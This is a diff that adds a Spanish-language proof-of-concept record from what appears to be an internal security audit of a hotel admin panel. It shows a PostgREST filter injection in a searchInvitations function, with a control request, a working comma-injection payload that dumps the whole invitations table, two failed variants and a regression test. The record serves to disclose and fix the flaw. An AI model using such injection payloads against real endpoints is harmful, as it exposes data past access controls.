@@ -1,0 +1,39 @@
+J2-POC-10 — Inyeccion en filtro PostgREST de searchInvitations (A03, introducida)
+Reproducido en vivo contra Supabase local (misma instancia de la rama security/users/fase2-pocs-faltantes).
+Endpoint real equivalente al que construye searchInvitations.ts: GET /rest/v1/pending_invitations
+con el filtro `or=(...)` armado exactamente como el codigo lo hace: `email.ilike.${search}%,email.ilike.%${search}%`.
+
+Tabla pending_invitations (seed, 2 filas):
+  manager@hotel.local   status=revoked
+  newadmin@hotel.local  status=pending
+
+--- Control (termino sin coincidencia literal) ---
+search  = "zzz_nonexistent_zzz"
+filter  = email.ilike.zzz_nonexistent_zzz%,email.ilike.%zzz_nonexistent_zzz%
+GET /rest/v1/pending_invitations?select=id,email,status&or=(<filter arriba, url-encoded>)
+-> 200 OK, 0 filas
+
+--- Ataque (coma inyectada agrega una 3ra condicion siempre verdadera) ---
+search  = nope,email.neq.""
+filter  = email.ilike.nope,email.neq.""%,email.ilike.%nope,email.neq.""%
+GET /rest/v1/pending_invitations?select=id,email,status&or=(<filter arriba, url-encoded>)
+-> 200 OK, 2 filas (el 100% de la tabla, ambos registros, incluido el revocado)
+[
+  {"id":"15f1a71e-636c-43bb-b2db-a03c6343320e","email":"manager@hotel.local","status":"revoked"},
+  {"id":"3578ba8a-01ea-4e52-9236-0fcb428ecc55","email":"newadmin@hotel.local","status":"pending"}
+]
+
+Headers usados: apikey / Authorization: Bearer <service_role JWT local> (el mismo cliente que usa
+createSupabaseServiceClient() dentro de searchInvitations.ts: la funcion ya bypassea RLS por diseno,
+igual que getAllInvitations/getPendingInvitations existentes; el unico control de acceso es
+requirePermission(ADMINS.INVITE) en la capa de aplicacion, que la inyeccion no afecta).
+
+Candidatos de ataque probados que SI fallan (quedan documentados para mostrar que no cualquier coma
+funciona, igual que el payload original corregido de AUD-POC-2/AUTH-POC-3):
+  search = nope,status.neq.""                                  -> 400 Bad Request (status es enum, neq con "" no castea)
+  search = nope,id.neq.00000000-0000-0000-0000-000000000000    -> 400 Bad Request (comparacion de uuid con valor sin casteo valido en este punto del filtro)
+
+Test de regresion (sin red, confirma la inyectabilidad del filtro por construccion):
+apps/panel-admin/tests/invitations/searchInvitations.test.ts
+  pnpm --filter @hotel/panel-admin exec vitest run tests/invitations/searchInvitations.test.ts
+  -> 2 passed
